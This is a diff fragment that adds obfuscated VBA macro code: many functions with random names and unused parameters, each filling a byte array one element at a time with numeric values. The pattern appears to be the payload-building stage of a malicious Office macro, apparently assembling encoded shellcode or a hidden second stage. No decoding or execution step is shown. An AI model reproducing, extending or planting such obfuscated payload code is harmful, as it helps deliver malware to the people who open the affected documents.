+d12gtNq(eahxeMrle + 8) = 144
+d12gtNq(eahxeMrle + 9) = 235
+d12gtNq(eahxeMrle + 10) = 173
+d12gtNq(994) = 233
+d12gtNq(eahxeMrle + 12) = 111
+d12gtNq(996) = 253
+d12gtNq(997) = 255
+d12gtNq(eahxeMrle + 15) = 255
+d12gtNq(999) = 235
+d12gtNq(eahxeMrle + 17) = 222
+d12gtNq(1001) = 233
+d12gtNq(1002) = 115
+d12gtNq(eahxeMrle + 20) = 253
+d12gtNq(eahxeMrle + 21) = 255
+d12gtNq(eahxeMrle + 22) = 255
+d12gtNq(eahxeMrle + 23) = 233
+d12gtNq(1007) = 230
+d12gtNq(1008) = 253
+d12gtNq(1009) = 255
+d12gtNq(eahxeMrle + 27) = 255
+d12gtNq(1011) = 233
+d12gtNq(eahxeMrle + 29) = 143
+d12gtNq(eahxeMrle + 30) = 253
+d12gtNq(1014) = 255
+d12gtNq(eahxeMrle + 32) = 255
+d12gtNq(1016) = 233
+d12gtNq(eahxeMrle + 34) = 190
+d12gtNq(eahxeMrle + 35) = 254
+d12gtNq(1019) = 255
+d12gtNq(1020) = 255
+d12gtNq(1021) = 235
+d12gtNq(1022) = 15
+d12gtNq(eahxeMrle + 40) = 233
+d12gtNq(eahxeMrle + 41) = 109
+d12gtNq(eahxeMrle + 42) = 253
+d12gtNq(1026) = 255
+d12gtNq(eahxeMrle + 44) = 255
+d12gtNq(1028) = 233
+d12gtNq(1029) = 174
+d12gtNq(eahxeMrle + 47) = 253
+d12gtNq(1031) = 255
+d12gtNq(eahxeMrle + 49) = 255
+d12gtNq(1033) = 233
+d12gtNq(1034) = 18
+d12gtNq(eahxeMrle + 52) = 254
+d12gtNq(eahxeMrle + 53) = 255
+d12gtNq(eahxeMrle + 54) = 255
+d12gtNq(eahxeMrle + 55) = 195
+d12gtNq(1039) = 110
+d12gtNq(1040) = 88
+d12gtNq(1041) = 232
+d12gtNq(eahxeMrle + 59) = 131
+d12gtNq(1043) = 114
+d12gtNq(eahxeMrle + 61) = 88
+d12gtNq(eahxeMrle + 62) = 236
+d12gtNq(1046) = 131
+d12gtNq(eahxeMrle + 64) = 60
+d12gtNq(1048) = 88
+d12gtNq(eahxeMrle + 66) = 179
+d12gtNq(eahxeMrle + 67) = 131
+d12gtNq(1051) = 41
+d12gtNq(1052) = 88
+d12gtNq(1053) = 234
+d12gtNq(1054) = 131
+d12gtNq(eahxeMrle + 72) = 99
+d12gtNq(eahxeMrle + 73) = 88
+d12gtNq(eahxeMrle + 74) = 238
+d12gtNq(1058) = 131
+d12gtNq(eahxeMrle + 76) = 111
+d12gtNq(1060) = 88
+d12gtNq(1061) = 250
+d12gtNq(eahxeMrle + 79) = 131
+d12gtNq(1063) = 127
+d12gtNq(eahxeMrle + 81) = 88
+d12gtNq(1065) = 251
+d12gtNq(1066) = 131
+d12gtNq(eahxeMrle + 84) = 107
+d12gtNq(eahxeMrle + 85) = 88
+d12gtNq(eahxeMrle + 86) = 253
+d12gtNq(eahxeMrle + 87) = 131
+d12gtNq(1071) = 111
+d12gtNq(1072) = 88
+d12gtNq(1073) = 240
+d12gtNq(eahxeMrle + 91) = 131
+d12gtNq(1075) = 101
+d12gtNq(eahxeMrle + 93) = 88
+d12gtNq(eahxeMrle + 94) = 243
+d12gtNq(1078) = 131
+d12gtNq(eahxeMrle + 96) = 107
+d12gtNq(1080) = 88
+d12gtNq(eahxeMrle + 98) = 178
+d12gtNq(eahxeMrle + 99) = 131
+
+End Function
+Private Function bpyiN(ByVal bkSf As Long, ByVal rdq6xJYUDRgc As Double, ByRef ijBMUhlYQjdo0 As Boolean, ByRef abTwE As Variant, ByVal S15Iwlf As Long, ByRef DgupRYobZsUR As String) As Variant
+abTwE(bkSf + 0) = 101
+abTwE(1084) = 88
+abTwE(bkSf + 2) = 243
+abTwE(bkSf + 3) = 131
+abTwE(1087) = 107
+abTwE(1088) = 88
+abTwE(1089) = 179
+abTwE(1090) = 131
+abTwE(bkSf + 8) = 114
+abTwE(bkSf + 9) = 88
+abTwE(bkSf + 10) = 249
+abTwE(1094) = 131
+abTwE(bkSf + 12) = 107
+abTwE(1096) = 88
+abTwE(1097) = 236
+abTwE(bkSf + 15) = 131
+abTwE(1099) = 126
+abTwE(bkSf + 17) = 88
+abTwE(1101) = 179
+abTwE(1102) = 131
+abTwE(bkSf + 20) = 52
+abTwE(bkSf + 21) = 88
+abTwE(bkSf + 22) = 172
+abTwE(bkSf + 23) = 131
+abTwE(1107) = 55
+abTwE(1108) = 88
+abTwE(1109) = 164
+abTwE(bkSf + 27) = 131
+abTwE(1111) = 89
+abTwE(bkSf + 29) = 88
+abTwE(bkSf + 30) = 243
+abTwE(1114) = 131
+abTwE(bkSf + 32) = 115
+abTwE(1116) = 88
+abTwE(bkSf + 34) = 232
+
+End Function
+Private Function mp1eu(ByVal v5e4Tp0 As Long, ByRef UoZ As Variant, ByVal nhi6dvUqHdes As Long) As Integer
+UoZ(nhi6dvUqHdes + 0) = 131
+UoZ(1119) = 118
+UoZ(1120) = 88
+UoZ(1121) = 233
+UoZ(nhi6dvUqHdes + 4) = 131
+UoZ(1123) = 114
+UoZ(nhi6dvUqHdes + 6) = 88
+UoZ(nhi6dvUqHdes + 7) = 217
+UoZ(1126) = 131
+UoZ(nhi6dvUqHdes + 9) = 71
+UoZ(1128) = 88
+UoZ(nhi6dvUqHdes + 11) = 169
+UoZ(nhi6dvUqHdes + 12) = 131
+UoZ(1131) = 68
+UoZ(1132) = 88
+UoZ(1133) = 175
+UoZ(1134) = 131
+UoZ(nhi6dvUqHdes + 17) = 62
+UoZ(nhi6dvUqHdes + 18) = 88
+UoZ(nhi6dvUqHdes + 19) = 218
+UoZ(1138) = 131
+UoZ(nhi6dvUqHdes + 21) = 40
+UoZ(1140) = 88
+UoZ(1141) = 249
+UoZ(nhi6dvUqHdes + 24) = 131
+UoZ(1143) = 126
+UoZ(nhi6dvUqHdes + 26) = 88
+UoZ(1145) = 249
+UoZ(1146) = 131
+UoZ(nhi6dvUqHdes + 29) = 6
+UoZ(nhi6dvUqHdes + 30) = 88
+UoZ(nhi6dvUqHdes + 31) = 185
+UoZ(nhi6dvUqHdes + 32) = 131
+UoZ(1151) = 71
+UoZ(1152) = 88
+UoZ(1153) = 204
+UoZ(nhi6dvUqHdes + 36) = 131
+UoZ(1155) = 86
+UoZ(nhi6dvUqHdes + 38) = 88
+UoZ(nhi6dvUqHdes + 39) = 216
+UoZ(1158) = 131
+UoZ(nhi6dvUqHdes + 41) = 71
+
+End Function
+Sub hsOb3ACbTQs5n(ByVal Cir As Object, ByVal ZFs4lx6yp As Long, ByVal vfmCFbq As Long, ByRef suRDMol3y0L7 As Byte, ByRef fWQvnG2f92aljO6 As Object, ByRef slJaKFXWQ As Variant)
+slJaKFXWQ(1160) = 88
+slJaKFXWQ(ZFs4lx6yp + 1) = 200
+slJaKFXWQ(ZFs4lx6yp + 2) = 131
+slJaKFXWQ(ZFs4lx6yp + 3) = 71
+slJaKFXWQ(1164) = 88
+slJaKFXWQ(ZFs4lx6yp + 5) = 185
+slJaKFXWQ(1166) = 131
+slJaKFXWQ(1167) = 6
+slJaKFXWQ(ZFs4lx6yp + 8) = 88
+slJaKFXWQ(1169) = 239
+slJaKFXWQ(ZFs4lx6yp + 10) = 131
+slJaKFXWQ(1171) = 98
+slJaKFXWQ(1172) = 88
+slJaKFXWQ(ZFs4lx6yp + 13) = 250
+slJaKFXWQ(ZFs4lx6yp + 14) = 131
+slJaKFXWQ(ZFs4lx6yp + 15) = 6
+slJaKFXWQ(ZFs4lx6yp + 16) = 88
+slJaKFXWQ(1177) = 249
+slJaKFXWQ(1178) = 131
+slJaKFXWQ(1179) = 126
+slJaKFXWQ(ZFs4lx6yp + 20) = 88
+
+End Sub
+Static Function LzmI3HKkTjceNn(ByRef kEx38KLzIoRJK As Currency, ByVal wYnlaMN90UzTG As Byte, ByVal QMhl2e As Long, ByVal ER9UqPFk As Long, ByRef e03b As Variant) As Currency
+e03b(QMhl2e + 0) = 249
+e03b(QMhl2e + 1) = 131
+e03b(QMhl2e + 2) = 6
+e03b(1184) = 88
+e03b(1185) = 156
+e03b(1186) = 131
+e03b(QMhl2e + 6) = 83
+e03b(1188) = 211
+e03b(QMhl2e + 8) = 112
+e03b(QMhl2e + 9) = 0
+e03b(1191) = 226
+e03b(QMhl2e + 11) = 160
+e03b(1193) = 29
+e03b(QMhl2e + 13) = 111
+e03b(QMhl2e + 14) = 138
+e03b(1196) = 90
+e03b(1197) = 156
+e03b(1198) = 131
+e03b(1199) = 85
+e03b(QMhl2e + 19) = 14
+e03b(QMhl2e + 20) = 203
+e03b(QMhl2e + 21) = 10
+e03b(1203) = 74
+e03b(QMhl2e + 23) = 124
+e03b(1205) = 232
+e03b(1206) = 231
+e03b(QMhl2e + 26) = 167
+e03b(1208) = 104
+e03b(QMhl2e + 28) = 156
+e03b(1210) = 131
+e03b(1211) = 6
+e03b(QMhl2e + 31) = 107
+e03b(QMhl2e + 32) = 71
+e03b(QMhl2e + 33) = 68
+e03b(QMhl2e + 34) = 66
+e03b(1216) = 124
+e03b(1217) = 136
+e03b(1218) = 214
+e03b(QMhl2e + 38) = 116
+e03b(1220) = 52
+e03b(QMhl2e + 40) = 241
+e03b(QMhl2e + 41) = 229
+e03b(1223) = 193
+e03b(QMhl2e + 43) = 28
+e03b(1225) = 184
+e03b(QMhl2e + 45) = 155
+e03b(QMhl2e + 46) = 105
+e03b(1228) = 54
+e03b(1229) = 20
+e03b(1230) = 223
+e03b(1231) = 34
+e03b(QMhl2e + 51) = 66
+e03b(QMhl2e + 52) = 91
+e03b(QMhl2e + 53) = 199
+e03b(1235) = 34
+
+End Function
+Static Function j5ig918OhjiE1VG(ByRef IZJAEztUCn As Currency, ByVal DLYqvrASX5MM As Long, ByVal iVL2e19GA As Long, ByVal sBbycFTmsvZywz7 As Currency, ByVal lI49 As Byte, ByRef ZpiK13EM9vM As Variant, ByRef g4NzMM590mzB As Integer) As Currency
+ZpiK13EM9vM(DLYqvrASX5MM + 0) = 24
+ZpiK13EM9vM(DLYqvrASX5MM + 1) = 201
+ZpiK13EM9vM(1238) = 209
+ZpiK13EM9vM(DLYqvrASX5MM + 3) = 74
+ZpiK13EM9vM(1240) = 28
+ZpiK13EM9vM(1241) = 91
+ZpiK13EM9vM(DLYqvrASX5MM + 6) = 199
+ZpiK13EM9vM(1243) = 34
+ZpiK13EM9vM(DLYqvrASX5MM + 8) = 28
+ZpiK13EM9vM(1245) = 243
+ZpiK13EM9vM(1246) = 244
+ZpiK13EM9vM(DLYqvrASX5MM + 11) = 104
+ZpiK13EM9vM(DLYqvrASX5MM + 12) = 52
+ZpiK13EM9vM(DLYqvrASX5MM + 13) = 91
+ZpiK13EM9vM(DLYqvrASX5MM + 14) = 199
+ZpiK13EM9vM(1251) = 34
+ZpiK13EM9vM(1252) = 16
+ZpiK13EM9vM(1253) = 243
+ZpiK13EM9vM(DLYqvrASX5MM + 18) = 226
+ZpiK13EM9vM(1255) = 98
+ZpiK13EM9vM(DLYqvrASX5MM + 20) = 12
+ZpiK13EM9vM(DLYqvrASX5MM + 21) = 91
+ZpiK13EM9vM(1258) = 199
+ZpiK13EM9vM(DLYqvrASX5MM + 23) = 34
+ZpiK13EM9vM(1260) = 20
+ZpiK13EM9vM(DLYqvrASX5MM + 25) = 243
+ZpiK13EM9vM(DLYqvrASX5MM + 26) = 197
+ZpiK13EM9vM(1263) = 111
+ZpiK13EM9vM(1264) = 52
+ZpiK13EM9vM(1265) = 250
+ZpiK13EM9vM(1266) = 68
+ZpiK13EM9vM(DLYqvrASX5MM + 31) = 66
+ZpiK13EM9vM(DLYqvrASX5MM + 32) = 124
+ZpiK13EM9vM(DLYqvrASX5MM + 33) = 204
+ZpiK13EM9vM(1270) = 230
+ZpiK13EM9vM(DLYqvrASX5MM + 35) = 81
+ZpiK13EM9vM(1272) = 208
+ZpiK13EM9vM(1273) = 192
+ZpiK13EM9vM(DLYqvrASX5MM + 38) = 167
+ZpiK13EM9vM(1275) = 84
+ZpiK13EM9vM(DLYqvrASX5MM + 40) = 159
+ZpiK13EM9vM(1277) = 216
+ZpiK13EM9vM(1278) = 167
+
+End Function
+Private Function DxUMBzGEzN4Od(ByRef j0Cp9ImprIy As Object, ByRef StRuexBIsJLyOP As Variant, ByRef nxMsz94kTdQmT As Date, ByVal Dn8CBzscPfgUh As Long, ByVal rJCk1VOeFxucff As Long) As Variant
+StRuexBIsJLyOP(1279) = 26
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 1) = 11
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 2) = 244
+StRuexBIsJLyOP(1282) = 230
+StRuexBIsJLyOP(1283) = 106
+StRuexBIsJLyOP(1284) = 159
+StRuexBIsJLyOP(1285) = 216
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 7) = 167
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 8) = 38
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 9) = 52
+StRuexBIsJLyOP(1289) = 175
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 11) = 177
+StRuexBIsJLyOP(1291) = 6
+StRuexBIsJLyOP(1292) = 159
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 14) = 216
+StRuexBIsJLyOP(1294) = 167
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 16) = 54
+StRuexBIsJLyOP(1296) = 11
+StRuexBIsJLyOP(1297) = 244
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 19) = 230
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 20) = 106
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 21) = 159
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 22) = 216
+StRuexBIsJLyOP(1302) = 167
+StRuexBIsJLyOP(1303) = 50
+StRuexBIsJLyOP(1304) = 52
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 26) = 217
+StRuexBIsJLyOP(1306) = 251
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 28) = 99
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 29) = 159
+StRuexBIsJLyOP(1309) = 216
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 31) = 167
+StRuexBIsJLyOP(1311) = 62
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 33) = 59
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 34) = 233
+StRuexBIsJLyOP(1314) = 247
+StRuexBIsJLyOP(1315) = 99
+StRuexBIsJLyOP(1316) = 62
+StRuexBIsJLyOP(1317) = 91
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 39) = 199
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 40) = 34
+StRuexBIsJLyOP(Dn8CBzscPfgUh + 41) = 100
+StRuexBIsJLyOP(1321) = 203
+
+End Function
+Private Function TtW8D(ByVal neenXOy1TKOX As Long, ByRef D7sYnf6S3d4IP As Single, ByVal nlkeDnCiTb2UNZe As Long, ByVal wMNVgEhh As Variant, ByRef ZyStFaIv As String, ByVal TtIcLpW87F As Long, ByRef FkszD20v5w As Variant) As Variant
+FkszD20v5w(TtIcLpW87F + 0) = 131
+FkszD20v5w(TtIcLpW87F + 1) = 193
+FkszD20v5w(1324) = 28
+FkszD20v5w(1325) = 184
+FkszD20v5w(1326) = 215
+FkszD20v5w(1327) = 67
+FkszD20v5w(TtIcLpW87F + 6) = 32
+FkszD20v5w(TtIcLpW87F + 7) = 236
+FkszD20v5w(TtIcLpW87F + 8) = 226
+FkszD20v5w(1331) = 193
+FkszD20v5w(TtIcLpW87F + 10) = 28
+FkszD20v5w(1333) = 184
+FkszD20v5w(1334) = 219
+FkszD20v5w(TtIcLpW87F + 13) = 104
+FkszD20v5w(1336) = 60
+FkszD20v5w(TtIcLpW87F + 15) = 217
+FkszD20v5w(1338) = 237
+FkszD20v5w(1339) = 193
+FkszD20v5w(TtIcLpW87F + 18) = 28
+FkszD20v5w(TtIcLpW87F + 19) = 184
+FkszD20v5w(TtIcLpW87F + 20) = 223
+FkszD20v5w(TtIcLpW87F + 21) = 112
+FkszD20v5w(1344) = 49
+FkszD20v5w(1345) = 238
+FkszD20v5w(1346) = 236
+FkszD20v5w(TtIcLpW87F + 25) = 193
+FkszD20v5w(1348) = 28
+FkszD20v5w(TtIcLpW87F + 27) = 184
+FkszD20v5w(TtIcLpW87F + 28) = 227
+FkszD20v5w(1351) = 104
+FkszD20v5w(TtIcLpW87F + 30) = 53
+FkszD20v5w(1353) = 249
+FkszD20v5w(TtIcLpW87F + 32) = 237
+FkszD20v5w(TtIcLpW87F + 33) = 193
+FkszD20v5w(1356) = 28
+FkszD20v5w(1357) = 184
+FkszD20v5w(1358) = 231
+FkszD20v5w(1359) = 114
+FkszD20v5w(TtIcLpW87F + 38) = 11
+FkszD20v5w(TtIcLpW87F + 39) = 232
+FkszD20v5w(TtIcLpW87F + 40) = 241
+FkszD20v5w(1363) = 193
+FkszD20v5w(TtIcLpW87F + 42) = 28
+
+End Function
+Public Function jk0LbuGhRU(ByVal WnxGohl8Yd3Wm9 As Long, ByRef LBmcFXEyBNIwHR As Variant, ByRef ziqRTCOlZkCPh64 As Currency, ByVal c3zUC As Long, ByRef U3pICfZ6 As Byte) As Currency
+LBmcFXEyBNIwHR(1365) = 184
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 1) = 235
+LBmcFXEyBNIwHR(1367) = 111
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 3) = 54
+LBmcFXEyBNIwHR(1369) = 251
+LBmcFXEyBNIwHR(1370) = 240
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 6) = 96
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 7) = 159
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 8) = 216
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 9) = 167
+LBmcFXEyBNIwHR(1375) = 106
+LBmcFXEyBNIwHR(1376) = 15
+LBmcFXEyBNIwHR(1377) = 156
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 13) = 68
+LBmcFXEyBNIwHR(1379) = 66
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 15) = 124
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 16) = 184
+LBmcFXEyBNIwHR(1382) = 198
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 18) = 126
+LBmcFXEyBNIwHR(1384) = 49
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 20) = 232
+LBmcFXEyBNIwHR(WnxGohl8Yd3Wm9 + 21) = 68
+LBmcFXEyBNIwHR(1387) = 66
+
+End Function
+Function vm4RjiK(ByRef NNOOhH2 As Variant, ByVal yo1BWqpH0 As Long, ByVal UQz56GZJ As Long, ByRef poy As Single) As Variant
+NNOOhH2(yo1BWqpH0 + 0) = 124
+NNOOhH2(1389) = 180
+NNOOhH2(1390) = 211
+NNOOhH2(1391) = 116
+NNOOhH2(1392) = 55
+NNOOhH2(yo1BWqpH0 + 5) = 255
+NNOOhH2(yo1BWqpH0 + 6) = 68
+NNOOhH2(yo1BWqpH0 + 7) = 66
+NNOOhH2(1396) = 124
+NNOOhH2(yo1BWqpH0 + 9) = 176
+NNOOhH2(1398) = 230
+NNOOhH2(1399) = 117
+NNOOhH2(yo1BWqpH0 + 12) = 43
+NNOOhH2(1401) = 156
+NNOOhH2(yo1BWqpH0 + 14) = 8
+NNOOhH2(1403) = 70
+NNOOhH2(1404) = 84
+NNOOhH2(yo1BWqpH0 + 17) = 23
+NNOOhH2(yo1BWqpH0 + 18) = 195
+NNOOhH2(yo1BWqpH0 + 19) = 10
+NNOOhH2(yo1BWqpH0 + 20) = 211
+NNOOhH2(1409) = 172
+NNOOhH2(1410) = 8
+NNOOhH2(1411) = 64
+NNOOhH2(yo1BWqpH0 + 24) = 104
+NNOOhH2(1413) = 116
+NNOOhH2(yo1BWqpH0 + 26) = 86
+NNOOhH2(yo1BWqpH0 + 27) = 7
+NNOOhH2(1416) = 88
+NNOOhH2(yo1BWqpH0 + 29) = 156
+NNOOhH2(1418) = 190
+NNOOhH2(yo1BWqpH0 + 31) = 124
+NNOOhH2(yo1BWqpH0 + 32) = 103
+NNOOhH2(1421) = 33
+NNOOhH2(1422) = 71
+NNOOhH2(1423) = 115
+NNOOhH2(1424) = 84
+NNOOhH2(yo1BWqpH0 + 37) = 29
+NNOOhH2(yo1BWqpH0 + 38) = 121
+NNOOhH2(yo1BWqpH0 + 39) = 187
+NNOOhH2(1428) = 186
+NNOOhH2(yo1BWqpH0 + 41) = 101
+NNOOhH2(1430) = 76
+NNOOhH2(1431) = 9
+NNOOhH2(yo1BWqpH0 + 44) = 220
+NNOOhH2(1433) = 42
+NNOOhH2(yo1BWqpH0 + 46) = 130
+
+End Function
+Public Function WozRM2JPuY5XI(ByRef CbJSC558IN5K8NR As Long, ByVal DYoZ5sep9 As Long, ByVal xuM As Long, ByVal gXT22JVawdruspF As Single, ByRef JwMF1 As Variant) As Date
+JwMF1(1435) = 6
+JwMF1(1436) = 88
+JwMF1(DYoZ5sep9 + 2) = 23
+JwMF1(1438) = 181
+JwMF1(DYoZ5sep9 + 4) = 61
+JwMF1(1440) = 171
+JwMF1(1441) = 233
+JwMF1(DYoZ5sep9 + 7) = 92
+JwMF1(DYoZ5sep9 + 8) = 143
+JwMF1(DYoZ5sep9 + 9) = 4
+JwMF1(DYoZ5sep9 + 10) = 184
+JwMF1(1446) = 243
+JwMF1(1447) = 141
+JwMF1(1448) = 163
+JwMF1(DYoZ5sep9 + 14) = 167
+JwMF1(1450) = 120
+JwMF1(DYoZ5sep9 + 16) = 9
+JwMF1(DYoZ5sep9 + 17) = 220
+JwMF1(1453) = 7
+JwMF1(DYoZ5sep9 + 19) = 130
+JwMF1(1455) = 6
+JwMF1(DYoZ5sep9 + 21) = 88
+JwMF1(DYoZ5sep9 + 22) = 244
+JwMF1(1458) = 24
+JwMF1(1459) = 243
+JwMF1(1460) = 96
+JwMF1(1461) = 32
+JwMF1(DYoZ5sep9 + 27) = 235
+JwMF1(DYoZ5sep9 + 28) = 2
+JwMF1(DYoZ5sep9 + 29) = 228
+JwMF1(1465) = 194
+JwMF1(DYoZ5sep9 + 31) = 82
+JwMF1(1467) = 81
+JwMF1(1468) = 176
+JwMF1(DYoZ5sep9 + 34) = 169
+JwMF1(1470) = 129
+JwMF1(DYoZ5sep9 + 36) = 6
+JwMF1(1472) = 88
+JwMF1(1473) = 21
+JwMF1(DYoZ5sep9 + 39) = 199
+JwMF1(DYoZ5sep9 + 40) = 34
+JwMF1(DYoZ5sep9 + 41) = 72
+JwMF1(DYoZ5sep9 + 42) = 167
+JwMF1(1478) = 64
+JwMF1(1479) = 9
+JwMF1(1480) = 220
+JwMF1(DYoZ5sep9 + 46) = 227
+JwMF1(1482) = 130
+JwMF1(DYoZ5sep9 + 48) = 6
+JwMF1(DYoZ5sep9 + 49) = 88
+JwMF1(1485) = 244
+JwMF1(DYoZ5sep9 + 51) = 92
+JwMF1(1487) = 116
+JwMF1(DYoZ5sep9 + 53) = 207
+
+End Function
+Static Function un7AeJrUgLZ4slD(ByVal sy7LqsrHEg As Long, ByVal atL As Long, ByRef lKgn9AMt9 As Variant) As Date
+lKgn9AMt9(1489) = 208
+lKgn9AMt9(atL + 1) = 235
+lKgn9AMt9(atL + 2) = 166
+lKgn9AMt9(1492) = 184
+lKgn9AMt9(1493) = 160
+lKgn9AMt9(1494) = 175
+lKgn9AMt9(1495) = 81
+lKgn9AMt9(atL + 7) = 176
+lKgn9AMt9(atL + 8) = 133
+lKgn9AMt9(atL + 9) = 129
+lKgn9AMt9(1499) = 6
+lKgn9AMt9(atL + 11) = 88
+lKgn9AMt9(1501) = 23
+lKgn9AMt9(1502) = 115
+lKgn9AMt9(atL + 14) = 61
+lKgn9AMt9(1504) = 171
+lKgn9AMt9(atL + 16) = 147
+lKgn9AMt9(1506) = 7
+lKgn9AMt9(1507) = 99
+lKgn9AMt9(atL + 19) = 89
+lKgn9AMt9(atL + 20) = 156
+lKgn9AMt9(atL + 21) = 131
+lKgn9AMt9(atL + 22) = 139
+lKgn9AMt9(1512) = 28
+lKgn9AMt9(1513) = 184
+lKgn9AMt9(1514) = 167
+lKgn9AMt9(atL + 26) = 86
+lKgn9AMt9(1516) = 15
+lKgn9AMt9(atL + 28) = 99
+lKgn9AMt9(atL + 29) = 85
+lKgn9AMt9(1519) = 143
+lKgn9AMt9(atL + 31) = 28
+lKgn9AMt9(1521) = 184
+lKgn9AMt9(atL + 33) = 143
+lKgn9AMt9(atL + 34) = 61
+lKgn9AMt9(1524) = 155
+lKgn9AMt9(1525) = 147
+lKgn9AMt9(1526) = 7
+lKgn9AMt9(1527) = 87
+lKgn9AMt9(atL + 39) = 89
+lKgn9AMt9(atL + 40) = 156
+lKgn9AMt9(atL + 41) = 131
+lKgn9AMt9(1531) = 139
+lKgn9AMt9(atL + 43) = 28
+lKgn9AMt9(1533) = 184
+lKgn9AMt9(1534) = 151
+lKgn9AMt9(atL + 46) = 86
+lKgn9AMt9(1536) = 167
+lKgn9AMt9(atL + 48) = 200
+lKgn9AMt9(1538) = 167
+lKgn9AMt9(1539) = 18
+lKgn9AMt9(atL + 51) = 211
+lKgn9AMt9(atL + 52) = 100
+lKgn9AMt9(atL + 53) = 184
+lKgn9AMt9(atL + 54) = 253
+lKgn9AMt9(1544) = 45
+lKgn9AMt9(1545) = 153
+lKgn9AMt9(1546) = 208
+lKgn9AMt9(atL + 58) = 249
+lKgn9AMt9(1548) = 12
+lKgn9AMt9(atL + 60) = 184
+lKgn9AMt9(atL + 61) = 147
+lKgn9AMt9(1551) = 139
+lKgn9AMt9(atL + 63) = 28
+lKgn9AMt9(1553) = 184
+lKgn9AMt9(atL + 65) = 195
+lKgn9AMt9(atL + 66) = 86
+lKgn9AMt9(1556) = 15
+lKgn9AMt9(1557) = 99
+lKgn9AMt9(1558) = 85
+lKgn9AMt9(1559) = 143
+lKgn9AMt9(atL + 71) = 220
+lKgn9AMt9(atL + 72) = 184
+lKgn9AMt9(atL + 73) = 15
+lKgn9AMt9(1563) = 6
+lKgn9AMt9(atL + 75) = 88
+lKgn9AMt9(1565) = 156
+lKgn9AMt9(1566) = 184
+lKgn9AMt9(atL + 78) = 197
+lKgn9AMt9(1568) = 45
+lKgn9AMt9(atL + 80) = 153
+lKgn9AMt9(1570) = 208
+lKgn9AMt9(1571) = 249
+lKgn9AMt9(atL + 83) = 12
+lKgn9AMt9(atL + 84) = 184
+lKgn9AMt9(atL + 85) = 147
+
+End Function
+Static Function En78(ByRef o7lQybX As Boolean, ByVal Jc8BfaKZtA2 As Long, ByRef YR7qcVPOiNl As String, ByRef DiiFLeMHJIs As Long, ByVal iNDYs7NqM9bMQpn As Long, ByRef HIi7J6Yl3kkJJ As Currency, ByRef n6Kb1WOJ7qurrG As Variant) As Byte
+n6Kb1WOJ7qurrG(1575) = 139
+n6Kb1WOJ7qurrG(1576) = 28
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 2) = 184
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 3) = 159
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 4) = 86
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 5) = 167
+n6Kb1WOJ7qurrG(1581) = 200
+n6Kb1WOJ7qurrG(1582) = 167
+n6Kb1WOJ7qurrG(1583) = 18
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 9) = 211
+n6Kb1WOJ7qurrG(1585) = 100
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 11) = 184
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 12) = 253
+n6Kb1WOJ7qurrG(1588) = 45
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 14) = 153
+n6Kb1WOJ7qurrG(1590) = 208
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 16) = 249
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 17) = 12
+n6Kb1WOJ7qurrG(1593) = 184
+n6Kb1WOJ7qurrG(1594) = 147
+n6Kb1WOJ7qurrG(1595) = 139
+n6Kb1WOJ7qurrG(1596) = 28
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 22) = 184
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 23) = 179
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 24) = 86
+n6Kb1WOJ7qurrG(1600) = 15
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 26) = 99
+n6Kb1WOJ7qurrG(1602) = 85
+n6Kb1WOJ7qurrG(1603) = 143
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 29) = 28
+n6Kb1WOJ7qurrG(1605) = 184
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 31) = 251
+n6Kb1WOJ7qurrG(1607) = 61
+n6Kb1WOJ7qurrG(1608) = 155
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 34) = 233
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 35) = 134
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 36) = 85
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 37) = 167
+n6Kb1WOJ7qurrG(1613) = 200
+n6Kb1WOJ7qurrG(1614) = 167
+n6Kb1WOJ7qurrG(1615) = 22
+n6Kb1WOJ7qurrG(Jc8BfaKZtA2 + 41) = 213
+n6Kb1WOJ7qurrG(1617) = 216
